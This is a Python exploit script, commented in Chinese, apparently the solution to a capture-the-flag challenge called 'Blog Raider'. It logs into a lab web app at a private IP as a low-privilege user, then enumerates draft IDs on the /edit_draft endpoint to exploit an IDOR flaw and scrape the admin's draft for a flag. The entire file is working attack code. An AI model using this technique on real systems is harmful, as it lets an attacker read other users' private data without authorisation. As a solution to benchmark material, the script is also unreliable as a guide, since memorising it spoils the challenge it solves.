#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
X-090-24 Blog Raider IDOR漏洞利用脚本

利用IDOR漏洞获取admin draft中的flag
目标：http://10.12.190.19:5003/
"""

import requests
import re
import sys
from urllib.parse import urljoin

class XBEN090Exploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

    def login(self, username='user', password='user'):
        """
        登录普通用户账户
        """
        login_url = urljoin(self.base_url, '/login')

        # 先获取登录页面，获取可能的CSRF token
        try:
            response = self.session.get(login_url)
            if response.status_code != 200:
                print(f"[-] 无法访问登录页面: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] 访问登录页面失败: {e}")
            return False

        # 提取CSRF token（如果存在）
        csrf_token = None
        if 'csrf_token' in response.text:
            csrf_match = re.search(r'name="csrf_token".*?value="([^"]+)"', response.text)
            if csrf_match:
                csrf_token = csrf_match.group(1)

        # 准备登录数据
        login_data = {
            'username': username,
            'password': password
        }

        # 如果有CSRF token，添加到数据中
        if csrf_token:
            login_data['csrf_token'] = csrf_token
            print(f"[*] 发现CSRF token: {csrf_token}")

        print(f"[*] 尝试登录用户: {username}")

        try:
            response = self.session.post(login_url, data=login_data, allow_redirects=False)

            if response.status_code in [302, 303]:
                location = response.headers.get('location', '')
                print(f"[+] 登录成功，重定向到: {location}")
                return True
            elif response.status_code == 200:
                # 检查是否登录成功（页面内容变化）
                if 'dashboard' in response.text or 'logout' in response.text:
                    print("[+] 登录成功")
                    return True
                elif 'Invalid username or password' in response.text:
                    print("[-] 登录失败：用户名或密码错误")
                    return False
                else:
                    print("[-] 登录状态不确定")
                    return False
            else:
                print(f"[-] 登录失败，状态码: {response.status_code}")
                print(f"[-] 响应内容: {response.text[:200]}")
                return False

        except Exception as e:
            print(f"[-] 登录过程中出错: {e}")
            return False

    def exploit_idor(self, draft_id=1):
        """
        利用IDOR漏洞访问admin的draft
        """
        edit_url = urljoin(self.base_url, f'/edit_draft/{draft_id}')

        print(f"[*] 正在访问admin的draft ID: {draft_id}")
        print(f"[*] 请求URL: {edit_url}")

        try:
            response = self.session.get(edit_url)

            if response.status_code == 200:
                print(f"[+] 成功访问draft ID: {draft_id}")

                # 解析HTML内容寻找flag
                html_content = response.text

                # 查找content字段（通常是textarea）
                content_patterns = [
                    r'<textarea[^>]*name=["\']content["\'][^>]*>([^<]+)</textarea>',
                    r'<textarea[^>]*id=["\']content["\'][^>]*>([^<]+)</textarea>',
                    r'content.*?value=["\']([^"\']+)["\']',
                    r'flag\{[^}]+\}',
                ]

                for pattern in content_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
                    if matches:
                        for match in matches:
                            # 清理匹配内容
                            content = match.strip()
                            if content and len(content) > 0:
                                print(f"[+] 找到内容: {content}")
                                if 'flag{' in content.lower():
                                    print(f"[+] 找到Flag: {content}")
                                    return content

                # 如果没有找到标准格式，尝试其他方法
                print("[-] 未在标准字段中找到flag，尝试其他方法...")

                # 查找所有可能包含flag的文本
                flag_patterns = [
                    r'flag\{[a-f0-9\-]+\}',
                    r'FLAG\{[A-F0-9\-]+\}',
                    r'flag\{[^}]+\}',
                ]

                for pattern in flag_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE)
                    if matches:
                        for flag in matches:
                            print(f"[+] 找到Flag: {flag}")
                            return flag

                # 输出页面内容用于调试
                print("页面内容摘要:")
                print(html_content[:800] + "..." if len(html_content) > 800 else html_content)

                return None

            elif response.status_code == 404:
                print(f"[-] Draft ID {draft_id} 不存在")
                return None
            elif response.status_code == 403:
                print(f"[-] 访问被拒绝，可能需要登录")
                return None
            else:
                print(f"[-] 访问失败，状态码: {response.status_code}")
                return None

        except Exception as e:
            print(f"[-] 访问draft时出错: {e}")
            return None

    def run(self):
        """
        执行完整的漏洞利用流程
        """
        print("=" * 60)
        print("X-090-24 Blog Raider IDOR漏洞利用脚本")
        print("=" * 60)

        # 步骤1：登录
        if not self.login():
            print("[-] 登录失败，无法继续利用")
            return False

        # 步骤2：尝试不同的draft ID
        draft_ids_to_try = [1, 2, 3, 10, 100]  # 尝试常见的admin draft ID

        for draft_id in draft_ids_to_try:
            print(f"\n[*] 尝试draft ID: {draft_id}")
            flag = self.exploit_idor(draft_id)
            if flag:
                print(f"\n[+] 漏洞利用成功!")
                print(f"[+] Flag: {flag}")
                return True

        print("\n[-] 未能获取flag，可能目标系统配置不同")
        return False

def main():
    """
    主函数，直接使用已知目标URL
    """
    # 直接使用目标URL
    target_url = "http://10.12.190.19:5003"

    print(f"[*] 目标URL: {target_url}")

    exploit = XBEN090Exploit(target_url)
    success = exploit.run()

    if success:
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()